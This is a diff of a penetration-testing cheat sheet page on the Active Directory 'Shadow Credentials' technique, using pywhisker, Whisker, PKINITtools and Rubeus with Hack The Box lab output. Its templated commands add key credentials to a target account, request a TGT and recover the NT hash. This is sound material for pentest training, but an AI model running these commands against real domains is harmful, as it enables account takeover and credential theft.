@@ -4,15 +4,16 @@ date: 2024-7-31
 tags: ["Shadow Credentials", "Pass-The-Cert", "AddkeyCredentialLink", "Active Directory", "Windows", "Whisker", "Pywhisker"]
 ---
 
-### Privesc #1: Shadow credentials
+### Privesc #1: Shadow Credentials
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 0. Pre-check \[optional\]
+#### 0. Pre-Check \[Optional\]
 
 ```console
+# Password
 python3 pywhisker.py -t '<TARGET_USER>' --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --use-ldaps
 ```
 
@@ -23,9 +24,15 @@ $ python3 pywhisker.py --action list -d outdated.htb -u 'btables' -p '5myBPLPDKT
 [*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute
 ```
 
-#### 1. Add shadow credentials
+```console
+# NTLM
+python3 pywhisker.py -t '<TARGET_USER>' --action list -d <DOMAIN> -u '<USER>' -H '<HASH>' --dc-ip <DC_IP> --use-ldaps
+```
+
+#### 1. Add Shadow Credentials
 
 ```console
+# Password
 python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> -t '<TARGET_USER>' --use-ldaps
 ```
 
@@ -44,6 +51,11 @@ $ python3 pywhisker.py --action add -d outdated.htb -u 'btables' -p '5myBPLPDKT3
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
+```console
+# NTLM
+python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -H '<HASH>' --dc-ip <DC_IP> -t '<TARGET_USER>' --use-ldaps
+```
+
 <br>
 
 ```console
@@ -51,10 +63,10 @@ $ python3 pywhisker.py --action add -d outdated.htb -u 'btables' -p '5myBPLPDKT3
 pip3 install -I pyopenssl==24.0.0
 ```
 
-#### 2. Request TGT using the PFX
+#### 2. Request a TGT Using the PFX
 
 ```console
-sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' <TARGET_USER>.ccache -dc-ip <DC>
+sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass '<GENERATED_PASSWORD>' '<DOMAIN>/<TARGET_USER>' '<TARGET_USER>.ccache' -dc-ip <DC>
 ```
 
 ```console {class="sample-code"}
@@ -72,7 +84,7 @@ INFO:minikerberos:a1870bb416f2b965df3df681288f3b272119d86288c67c572675b80ea1bedd
 INFO:minikerberos:Saved TGT to file
 ```
 
-#### 3. Get NT hash
+#### 3. Get NT Hash
 
 ```console
 export KRB5CCNAME=<TARGET_USER>.ccache
@@ -99,7 +111,7 @@ Recovered NT Hash
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
-#### 0. Pre-check \[optional\]
+#### 0. Pre-Check \[optional\]
 
 ```console
 .\whisker.exe list /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC>
@@ -113,7 +125,7 @@ PS C:\programdata> .\whisker.exe list /domain:outdated.htb /target:'sflowers' /d
 [*] No entries!
 ```
 
-#### 1. Add shadow credentials
+#### 1. Add Shadow Credentials
 
 ```console
 .\whisker.exe add /domain:<DOMAIN> /target:'<TARGET_USER>' /dc:<DC> /password:'<PFX_PASSWORD>'
@@ -135,7 +147,7 @@ PS C:\programdata> .\whisker.exe add /domain:outdated.htb /target:'sflowers' /dc
 Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz ... [SNIP]... TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
 ```
 
-#### 2. Request TGT using PFX file and get NTLM hash
+#### 2. Request a TGT Using the PFX File and Get NTLM Hash
 
 ```console
 .\rubeus.exe asktgt /user:'<TARGET_USER>' /certificate:'<BASE64_PFX>' /password:'<PFX_PASSWORD>' /domain:<DOMAIN> /dc:<DC> /getcredentials /show
